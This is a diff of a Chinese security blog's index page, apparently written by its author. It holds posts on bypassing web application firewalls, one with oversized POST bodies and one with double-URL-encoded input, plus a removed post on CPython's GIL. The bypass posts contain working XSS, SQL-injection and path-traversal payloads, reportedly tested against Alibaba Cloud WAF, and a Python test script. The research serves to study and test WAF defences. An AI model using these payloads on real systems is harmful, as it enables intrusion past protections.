-<p><em>那为啥waf作者没有处理临时文件呢？</em></p>
-<p>可能是忘了，也可能觉得损耗性能。这里的性能我理解主要是与 io、内存有关。</p>
-<p>在openresty中读文件可以有两个api：</p>
-<blockquote>
-<p> ngx_io.open，此api是非阻塞的</p>
-<p> io.open，此api是阻塞的</p>
-</blockquote>
-<p>如果使用<code>io.open</code>读”临时文件”，整个nginx worker就会卡在这个读文件步骤中，肯定会导致整个集群能服务的最大并发数变低。</p>
-<p>如果使用<code>lua-io-nginx-module</code>模块的<code>ngx_io.open</code>非阻塞api来代替<code>io.open</code>阻塞api来读文件，虽然不会阻塞整个nginx worker，但”读文件io操作”还是要和磁盘打交道，需要中断和多次内存拷贝，还是有性能损耗。</p>
-<p>并且，如果服务是将文件一次性读取到内存中时，那”不怀好意”的人多搞几个这样”post请求体过大”的请求，就有可能导致机器内存耗尽。</p>
-</li>
-<li><p>什么场景下可以使用这种绕过姿势？</p>
-<p>即使waf放行了，也需要后端支持这种超大的请求体。而不少服务对请求体大小是有限制的。</p>
-<p>比如nginx的<a target="_blank" rel="noopener" href="http://nginx.org/en/docs/http/ngx_http_core_module.html#client_max_body_size">client_max_body_size</a>:如果请求体大小超过此设置值，就会返回 413 (Request Entity Too Large)  错误。 此配置为0表示不限制请求体大小。</p>
-<p>再比如php的<a target="_blank" rel="noopener" href="https://www.php.net/manual/en/ini.core.php#ini.post-max-size">post-max-size</a>:如果请求体大小超过此设置值，<code>$_POST</code>和<code>$_FILES</code>会为空。</p>
-<p><em>所以满足以下条件时，应该可以利用成功</em>:</p>
-<blockquote>
-<p>请求体大小超过waf client_body_buffer_size配置限制，且waf没有处理临时文件</p>
-<p>请求体大小未超过后端服务的大小限制</p>
-</blockquote>
-</li>
-</ul>
-<h1 id="怎么测试"><a href="#怎么测试" class="headerlink" title="怎么测试"></a>怎么测试</h1><p>客户端的测试代码如下，需要看情况调整big_str的大小</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">host &#x3D; &quot;a.baidu.com&quot;</span><br><span class="line">url &#x3D; &quot;http:&#x2F;&#x2F;127.0.0.1:9998&#x2F;a.php&quot;</span><br><span class="line">payload &#x3D; &quot;..&#x2F;..&#x2F;..&#x2F;&quot;</span><br><span class="line">big_str &#x3D; &quot;A&quot;*1024*1024*200  # 200M</span><br><span class="line"></span><br><span class="line">headers &#x3D; &#123;&quot;Host&quot;: host, &quot;Content-Type&quot;: &quot;application&#x2F;x-www-form-urlencoded&quot;&#125;</span><br><span class="line">data &#x3D; &quot;a&#x3D;%s&amp;b&#x3D;%s&quot; % (big_str, payload)</span><br><span class="line"></span><br><span class="line">res &#x3D; requests.post(url, data&#x3D;data, headers&#x3D;headers)</span><br><span class="line">print(res.content.decode(&quot;utf8&quot;))</span><br><span class="line">print(res.status_code)</span><br></pre></td></tr></table></figure>
-
-<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>本文并没有研究waf厂商是怎么解决这个问题的，比如pdf提到的stream模式是怎么实现的、stream模式是否可以绕过。</p>
-<p>绕过waf防护的原因是请求体过大时会被存放到”临时文件”中，而不处理”临时文件”是出于io、内存等性能考虑。</p>
-<p>这种绕过姿势还需要”请求体大小未超过后端服务的大小限制”才能利用成功。</p>
-<p>另外 “post请求过大为什么会绕过waf”还有两个可能的原因：</p>
-<blockquote>
-<ul>
-<li>payload刚好被”tcp分片”</li>
-<li><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/jw0vPIvgCdt1090j3-Sxqw">正则回溯次数超过限制</a></li>
-</ul>
-</blockquote>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-%E4%BD%A0%E7%9A%84%E6%89%AB%E6%8F%8F%E5%99%A8%E5%8F%AF%E4%BB%A5%E7%BB%95%E8%BF%87%E9%98%B2%E7%81%AB%E5%A2%99%E4%B9%88%EF%BC%88%E4%BA%8C%EF%BC%89/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="leveryd">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="leveryd的个人博客">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2021-12-26-%E4%BD%A0%E7%9A%84%E6%89%AB%E6%8F%8F%E5%99%A8%E5%8F%AF%E4%BB%A5%E7%BB%95%E8%BF%87%E9%98%B2%E7%81%AB%E5%A2%99%E4%B9%88%EF%BC%88%E4%BA%8C%EF%BC%89/" class="post-title-link" itemprop="url">你的扫描器可以绕过防火墙么（二）</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-
-      <time title="创建时间：2021-12-26 15:33:56" itemprop="dateCreated datePublished" datetime="2021-12-26T15:33:56+08:00">2021-12-26</time>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>看了<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/P5h9_K4YcvsrU4tsdHsJdQ">你的扫描器可以绕过防火墙么？（一）</a>的可能会觉得文章中用base64绕过场景有限。这篇文章介绍一种绕过场景更多一点的方法。</p>
-<p>用过商业waf产品的应该都知道，waf一般都会支持多种解码类型，比如base64、url、unicode等。</p>
-<p>所以<code>Li4vLi4vLi4vZXRjL3Bhc3N3ZA==</code>(“../../../etc/passwd”的base64编码)这种payload，会被waf解码后拦截。</p>
-<p>这里存在一个设计问题：如果waf只检测解码后的数据，不检测原始数据，就会存在一种通用绕过，很多web防护都有可能失效。</p>
-<p>我研究了下面的问题：</p>
-<ul>
-<li>怎么验证waf是否”只检测解码后的数据，不检测原始数据”？</li>
-<li>哪些waf存在这种绕过风险？</li>
-<li>怎么利用？</li>
-</ul>
-<h1 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h1><ul>
-<li><p>怎么验证？</p>
-<p>构造满足下面条件的数据：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">* 如果waf没有解码模块，此数据就应该被拦截</span><br><span class="line">* 如果waf有解码模块，解码后，此数据不应该被拦截</span><br></pre></td></tr></table></figure>
-
-<p>如果这个数据经过waf没有被拦截，就说明 存在风险。</p>
-<p>比如，如果有一个waf面对如下的测试payload</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script a&#x3D;&quot;&quot;&gt;alert(1) &#x2F;&#x2F; 被waf拦截</span><br><span class="line">&lt;script a&#x3D;&quot;&quot;&gt;&lt;&#x2F;script&gt;&lt;x a&#x3D;&quot;&gt;alert(1) &#x2F;&#x2F; 不被waf拦截</span><br></pre></td></tr></table></figure>
-<p>其中第二个payload是通过”在第一个payload双引号中添加数据”构造出来的</p>
-<p>就可以构造出下面的”最终payload”：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script a&#x3D;&quot;%25%32%32%25%33%65%25%33%63%25%32%66%25%37%33%25%36%33%25%37%32%25%36%39%25%37%30%25%37%34%25%33%65%25%33%63%25%37%38%25%32%30%25%36%31%25%33%64&quot;&gt;alert(1)</span><br></pre></td></tr></table></figure>
-
-<p>如果”此waf只检测解码后的数据，不检测原始数据”，就不会拦截”最终payload”</p>
-</li>
-<li><p>验证阿里云waf</p>
-<p>以下是阿里云waf实际拦截结果</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a&#x3D;&lt;svg onload&#x3D;&#39;xxxx&#x3D;&quot;x alert&quot;&#39;&gt;  拦截</span><br><span class="line">a&#x3D;&lt;svg onload&#x3D;&#39;xxxx&#x3D;&quot;x&quot;&gt; alert&quot;&#39;&gt;  不拦截</span><br></pre></td></tr></table></figure>
-
-<p>所以可以构造出下面的payload并验证</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a&#x3D;&lt;svg onload&#x3D;&#39;xxxx&#x3D;&quot;x%25%32%32%25%33%65 alert&quot;&#39;&gt;  没有拦截</span><br></pre></td></tr></table></figure>
-
-<p>所以，阿里云waf确实存在风险，用<code>a=&lt;svg onload=&#39;xxxx=&quot;x%25%32%32%25%33%65&quot;; alert(1);&#39;&gt;</code>payload就可以绕过</p>
-</li>
-<li><p>验证长亭waf</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a&#x3D;alert(&quot;111&quot;)  中危</span><br><span class="line">a&#x3D;alert(&quot;111&quot;&quot;) 正常</span><br></pre></td></tr></table></figure>
-
-<p>所以可以构造出下面的payload并验证</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a&#x3D;alert(&quot;111%25%32%32&quot;)   中危</span><br></pre></td></tr></table></figure>
-
-<p>所以，长亭waf不存在此风险</p>
-</li>
-<li><p>怎么利用？</p>
-<p>如果waf存在此风险，就有可能导致非常多的web防护失效。</p>
-<p>构造payload的过程如同上面”怎么验证”的过程。</p>
-<p>下面再补充一个同样方式绕过阿里云sql注入防护的案例：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">a&#x3D;union&#x2F;*anything*&#x2F;select &quot;111&quot;  拦截</span><br><span class="line">a&#x3D;union&#x2F;**&#x2F;*&#x2F; select &quot;111&quot;  未拦截，但是此payload不是有效的</span><br><span class="line"></span><br><span class="line">因此可以得到下面 不拦截、且有效的 payload</span><br><span class="line">a&#x3D;union&#x2F;*%25%32%61%25%32%66*&#x2F;select &quot;111&quot;  未拦截，且payload有效</span><br></pre></td></tr></table></figure>
-
-</li>
-</ul>
-<h1 id="最后给自己的公众号打下广告"><a href="#最后给自己的公众号打下广告" class="headerlink" title="最后给自己的公众号打下广告"></a>最后给自己的公众号打下广告</h1><p>我在内部安全保障、安全产品两个方向有一些工作经验；在启明、百度等大厂也都呆过，也曾在房多多和安全团队一起做过从0到1的安全建设；在漏洞挖掘这一块虽然不是经验丰富，但之前也给”华为、阿里、360、百度、字节”等国内的大厂提交过一些高危严重漏洞（PS：并不代表我觉得这些src都非常好）；</p>
-<p>我后面会持续写 “安全产品”、”后端开发”、”有意思的安全问题/漏洞”，如果读者有什么想一起讨论的”题材”，欢迎在公众号后台留言；</p>
-<p>目前公众号一篇文章阅读量只有50-70，感觉太惨淡了。如果读者觉得我的文章有帮助，就希望能在公众号”点赞、在看、分享”，”点赞”和”在看”似乎也能增加一些曝光量。要不然文章就只能关注的人才能看得到。</p>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-%E4%BD%A0%E7%9A%84%E6%89%AB%E6%8F%8F%E5%99%A8%E5%8F%AF%E4%BB%A5%E7%BB%95%E8%BF%87%E9%98%B2%E7%81%AB%E5%A2%99%E4%B9%88%EF%BC%88%E4%B8%80%EF%BC%89/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1356,7 +1339,7 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-CPython%E7%9A%84%E7%BA%BF%E7%A8%8B%E4%B8%8EGIL/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-%E4%BD%A0%E7%9A%84%E6%89%AB%E6%8F%8F%E5%99%A8%E5%8F%AF%E4%BB%A5%E7%BB%95%E8%BF%87%E9%98%B2%E7%81%AB%E5%A2%99%E4%B9%88%EF%BC%88%E4%BA%8C%EF%BC%89/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -1369,7 +1352,7 @@
     </span>
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
-          <a href="/2021-12-26-CPython%E7%9A%84%E7%BA%BF%E7%A8%8B%E4%B8%8EGIL/" class="post-title-link" itemprop="url">CPython的线程与GIL</a>
+          <a href="/2021-12-26-%E4%BD%A0%E7%9A%84%E6%89%AB%E6%8F%8F%E5%99%A8%E5%8F%AF%E4%BB%A5%E7%BB%95%E8%BF%87%E9%98%B2%E7%81%AB%E5%A2%99%E4%B9%88%EF%BC%88%E4%BA%8C%EF%BC%89/" class="post-title-link" itemprop="url">你的扫描器可以绕过防火墙么（二）</a>
         </h2>
 
         <div class="post-meta-container">
@@ -1393,113 +1376,58 @@
     
     
     <div class="post-body" itemprop="articleBody">
-          <h1 id="问题背景"><a href="#问题背景" class="headerlink" title="问题背景"></a>问题背景</h1><p>CPython程序的GIL会导致在CPU密集型任务中，多线程并不能提高运算速度。</p>
-<p>比如<a target="_blank" rel="noopener" href="https://gist.github.com/leveryd/55adf1303fa7e528cc446d4e41526604" title="test.py">test.py</a>例子中，从执行test2函数和test1函数时间对比可以看出来，多线程并没有比单线程跑得更快。</p>
-<p>本文主要学习总结GIL、线程和GIL的关系，回答以下问题：</p>
+          <h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>看了<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/P5h9_K4YcvsrU4tsdHsJdQ">你的扫描器可以绕过防火墙么？（一）</a>的可能会觉得文章中用base64绕过场景有限。这篇文章介绍一种绕过场景更多一点的方法。</p>
+<p>用过商业waf产品的应该都知道，waf一般都会支持多种解码类型，比如base64、url、unicode等。</p>
+<p>所以<code>Li4vLi4vLi4vZXRjL3Bhc3N3ZA==</code>(“../../../etc/passwd”的base64编码)这种payload，会被waf解码后拦截。</p>
+<p>这里存在一个设计问题：如果waf只检测解码后的数据，不检测原始数据，就会存在一种通用绕过，很多web防护都有可能失效。</p>
+<p>我研究了下面的问题：</p>
 <ul>
-<li>GIL<ul>
-<li>GIL是什么？</li>
-<li>为什么存在GIL？</li>
-<li>能否去掉GIL，让Python程序应用层加锁来代替GIL的作用？</li>
+<li>怎么验证waf是否”只检测解码后的数据，不检测原始数据”？</li>
+<li>哪些waf存在这种绕过风险？</li>
+<li>怎么利用？</li>
 </ul>
+<h1 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h1><ul>
+<li><p>怎么验证？</p>
+<p>构造满足下面条件的数据：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">* 如果waf没有解码模块，此数据就应该被拦截</span><br><span class="line">* 如果waf有解码模块，解码后，此数据不应该被拦截</span><br></pre></td></tr></table></figure>
+
+<p>如果这个数据经过waf没有被拦截，就说明 存在风险。</p>
+<p>比如，如果有一个waf面对如下的测试payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script a&#x3D;&quot;&quot;&gt;alert(1) &#x2F;&#x2F; 被waf拦截</span><br><span class="line">&lt;script a&#x3D;&quot;&quot;&gt;&lt;&#x2F;script&gt;&lt;x a&#x3D;&quot;&gt;alert(1) &#x2F;&#x2F; 不被waf拦截</span><br></pre></td></tr></table></figure>
+<p>其中第二个payload是通过”在第一个payload双引号中添加数据”构造出来的</p>
+<p>就可以构造出下面的”最终payload”：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script a&#x3D;&quot;%25%32%32%25%33%65%25%33%63%25%32%66%25%37%33%25%36%33%25%37%32%25%36%39%25%37%30%25%37%34%25%33%65%25%33%63%25%37%38%25%32%30%25%36%31%25%33%64&quot;&gt;alert(1)</span><br></pre></td></tr></table></figure>
+
+<p>如果”此waf只检测解码后的数据，不检测原始数据”，就不会拦截”最终payload”</p>
 </li>
-<li>线程和GIL的关系<ul>
-<li>Python的线程是真线程吗？</li>
-<li>既然GIL能保证只有一个线程在执行字节码，为什么我们用Python多线程时还需要考虑线程安全？</li>
-<li>持有GIL的线程什么时候释放GIL？</li>
-<li>未持有GIL的线程什么时候申请GIL？</li>
-<li>怎么保证两个线程不会同时抢到GIL？</li>
-<li>为什么CPython要保证只有一个线程在执行字节码？</li>
-<li>CPython线程什么时候切换？</li>
+<li><p>验证阿里云waf</p>
+<p>以下是阿里云waf实际拦截结果</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a&#x3D;&lt;svg onload&#x3D;&#39;xxxx&#x3D;&quot;x alert&quot;&#39;&gt;  拦截</span><br><span class="line">a&#x3D;&lt;svg onload&#x3D;&#39;xxxx&#x3D;&quot;x&quot;&gt; alert&quot;&#39;&gt;  不拦截</span><br></pre></td></tr></table></figure>
+
+<p>所以可以构造出下面的payload并验证</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a&#x3D;&lt;svg onload&#x3D;&#39;xxxx&#x3D;&quot;x%25%32%32%25%33%65 alert&quot;&#39;&gt;  没有拦截</span><br></pre></td></tr></table></figure>
+
+<p>所以，阿里云waf确实存在风险，用<code>a=&lt;svg onload=&#39;xxxx=&quot;x%25%32%32%25%33%65&quot;; alert(1);&#39;&gt;</code>payload就可以绕过</p>
+</li>
+<li><p>验证长亭waf</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a&#x3D;alert(&quot;111&quot;)  中危</span><br><span class="line">a&#x3D;alert(&quot;111&quot;&quot;) 正常</span><br></pre></td></tr></table></figure>
+
+<p>所以可以构造出下面的payload并验证</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a&#x3D;alert(&quot;111%25%32%32&quot;)   中危</span><br></pre></td></tr></table></figure>
+
+<p>所以，长亭waf不存在此风险</p>
+</li>
+<li><p>怎么利用？</p>
+<p>如果waf存在此风险，就有可能导致非常多的web防护失效。</p>
+<p>构造payload的过程如同上面”怎么验证”的过程。</p>
+<p>下面再补充一个同样方式绕过阿里云sql注入防护的案例：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">a&#x3D;union&#x2F;*anything*&#x2F;select &quot;111&quot;  拦截</span><br><span class="line">a&#x3D;union&#x2F;**&#x2F;*&#x2F; select &quot;111&quot;  未拦截，但是此payload不是有效的</span><br><span class="line"></span><br><span class="line">因此可以得到下面 不拦截、且有效的 payload</span><br><span class="line">a&#x3D;union&#x2F;*%25%32%61%25%32%66*&#x2F;select &quot;111&quot;  未拦截，且payload有效</span><br></pre></td></tr></table></figure>
+
+</li>
 </ul>
-</li>
-</ul>
-<p>分析的CPython是3.8.0版本，commit id是fa919fdf2583bdfead1df00e842f24f30b2a34bf</p>
-<h1 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h1><h2 id="GIL"><a href="#GIL" class="headerlink" title="GIL"></a>GIL</h2><ol>
-<li><p>GIL是什么？</p>
-<p> CPython的一个全局解释锁。</p>
-</li>
-<li><p>为什么存在GIL？</p>
-<p> <a target="_blank" rel="noopener" href="https://wiki.python.org/moin/GlobalInterpreterLock" title="GIL">GIL</a>文档中写到，GIL可以保证多线程场景中，只有一个线程在执行字节码。</p>
-<p> 这样可以避免确保在CPython源码层面是线程安全的。</p>
-<p> 假设没有了GIL，多线程运行时，引用计数就有可能出现问题。</p>
-</li>
-<li><p>能否去掉GIL，让Python程序应用层加锁来代替？</p>
-<p> 如果python程序多线程全部在消费者代码第一行就加锁，就可以代替GIL。（只是我的推测，没有验证过，结论不一定对。）</p>
-<p> 但是实际编写Python代码时，不可能要求所有的线程都加锁。如下的代码中，单线程和多线程也就没有区别了。</p>
- <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">lock &#x3D; threading.Lock()</span><br><span class="line"></span><br><span class="line">class Worker2(threading.Thread):</span><br><span class="line">  def run(self):</span><br><span class="line">    with lock:</span><br><span class="line">      ....</span><br></pre></td></tr></table></figure>
-
-</li>
-</ol>
-<h2 id="线程和GIL"><a href="#线程和GIL" class="headerlink" title="线程和GIL"></a>线程和GIL</h2><ol>
-<li><p>Python的线程是真线程吗？</p>
-<p> Unix/Linux上的Python线程是真线程（Windows平台的不清楚）。是操作系统层面的线程，会受操作系统调度。</p>
-<p> 在Python/thread_pthread.h文件中，可以看到调用pthread_create函数创建系统线程。</p>
- <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">unsigned long</span><br><span class="line">PyThread_start_new_thread(void (*func)(void *), void *arg)</span><br><span class="line">&#123;</span><br><span class="line">    pthread_t th;</span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    status &#x3D; pthread_create(&amp;th,   &#x2F;&#x2F; 调用pthread_create函数创建系统线程</span><br><span class="line">      ...</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>既然GIL能保证只有一个线程在执行字节码，为什么我们用Python多线程时还需要考虑线程安全？</p>
-<p> 因为一行Python代码，可能会包含多个字节码。GIL可以保证字节码执行时是线程安全的，但是无法保证每一行Python代码是线程安全的。</p>
-<p> 比如 n=n+1 一行代码，会被解释成多个字节码</p>
- <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import dis</span><br><span class="line">&gt;&gt;&gt; dis.dis(&quot;n&#x3D;n+1&quot;)</span><br><span class="line">  1           0 LOAD_NAME                0 (n)</span><br><span class="line">              2 LOAD_CONST               0 (1)</span><br><span class="line">              4 BINARY_ADD</span><br><span class="line">              6 STORE_NAME               0 (n)</span><br><span class="line">              8 LOAD_CONST               1 (None)</span><br><span class="line">             10 RETURN_VALUE</span><br></pre></td></tr></table></figure>
-
-<p> 可以见参考文章详解。</p>
-</li>
-</ol>
-<ol start="3">
-<li><p>持有GIL的线程什么时候释放GIL？</p>
-<p> 先说结论：如果未持有GIL的线程太久没有获取GIL，已经持有GIL的线程就会释放锁。</p>
-<p> 在ceval.c#1237行中可以看到：ceval-&gt;gil_drop_request 被标记时，会释放锁。</p>
- <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">main_loop:</span><br><span class="line">    for (;;) &#123;</span><br><span class="line">      ...</span><br><span class="line"></span><br><span class="line">      if (_Py_atomic_load_relaxed(&amp;ceval-&gt;gil_drop_request)) &#123;  &#x2F;&#x2F; 其他线程要求当前线程释放锁</span><br><span class="line">           &#x2F;* Give another thread a chance *&#x2F;</span><br><span class="line">           if (_PyThreadState_Swap(&amp;runtime-&gt;gilstate, NULL) !&#x3D; tstate) &#123;</span><br><span class="line">               Py_FatalError(&quot;ceval: tstate mix-up&quot;);</span><br><span class="line">           &#125;</span><br><span class="line">           drop_gil(ceval, tstate);   &#x2F;&#x2F; 当前线程释放锁</span><br><span class="line"></span><br><span class="line">           &#x2F;* Other threads may run now *&#x2F;</span><br><span class="line"></span><br><span class="line">           take_gil(ceval, tstate);   &#x2F;&#x2F; 当前线程尝试再获取锁</span><br><span class="line"></span><br><span class="line">           ...</span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure>
-
-<p> eval-&gt;gil_drop_request 什么时候被标记呢？</p>
-<p> 看下面的代码可以得出结论：如果 未持有GIL的线程 超过了等待时间 且 GIL是锁住的状态 且 GIL的持有者没有变更过，就会标记 ceval-&gt;gil_drop_request变量。</p>
- <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">static void take_gil(PyThreadState *tstate)</span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">    while (_Py_atomic_load_relaxed(&amp;_PyRuntime.ceval.gil.locked)) &#123;  &#x2F;&#x2F; 只要 gil 是锁住的状态, 进入这个循环</span><br><span class="line">        int timed_out &#x3D; 0;</span><br><span class="line">        unsigned long saved_switchnum;</span><br><span class="line"></span><br><span class="line">        saved_switchnum &#x3D; _PyRuntime.ceval.gil.switch_number;   &#x2F;&#x2F; 保存当前持有GIL的身份</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; 释放 gil.mutex, 并在以下两种条件下唤醒</span><br><span class="line">        &#x2F;&#x2F; 1. 等待 INTERVAL 微秒(默认 5000)</span><br><span class="line">        &#x2F;&#x2F; 2. 还没有等待到 5000 微秒但是收到了 gil.cond 的信号</span><br><span class="line"></span><br><span class="line">        COND_TIMED_WAIT(_PyRuntime.ceval.gil.cond, _PyRuntime.ceval.gil.mutex,</span><br><span class="line">                        INTERVAL, timed_out);</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; 如果超过了等待时间 &amp;&amp; GIL是锁住的状态 &amp;&amp; GIL的持有者没有变更过</span><br><span class="line">        if (timed_out &amp;&amp;</span><br><span class="line">            _Py_atomic_load_relaxed(&amp;_PyRuntime.ceval.gil.locked) &amp;&amp;</span><br><span class="line">            _PyRuntime.ceval.gil.switch_number &#x3D;&#x3D; saved_switchnum) &#123;</span><br><span class="line"></span><br><span class="line">            SET_GIL_DROP_REQUEST();  &#x2F;&#x2F; 把 gil_drop_request 值设为 1, 持有GIL的线程看到这个值的时候, 会尝试释放GIL</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p> 所以，当未持有GIL的线程太久没有获取GIL了，就会设置一个全局变量。当前持有GIL的线程看到全局变量后，就知道自己要释放GIL。</p>
-</li>
-<li><p>未持有GIL的线程什么时候申请GIL？</p>
-<p> 先说结论：正在持有GIL的线程释放后，未持有GIL的线程可以获得GIL。</p>
-<p> 申请GIL的代码在Python/ceval_gil.h#take_gil中，可以看到 未持有GIL的线程 通过while循环 来等GIL释放。</p>
- <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">static void</span><br><span class="line">take_gil(struct _ceval_runtime_state *ceval, PyThreadState *tstate)</span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line">  while (_Py_atomic_load_relaxed(&amp;gil-&gt;locked)) &#123; &#x2F;&#x2F; gil 不是锁住状态时跳出循环</span><br><span class="line">      ...</span><br><span class="line">  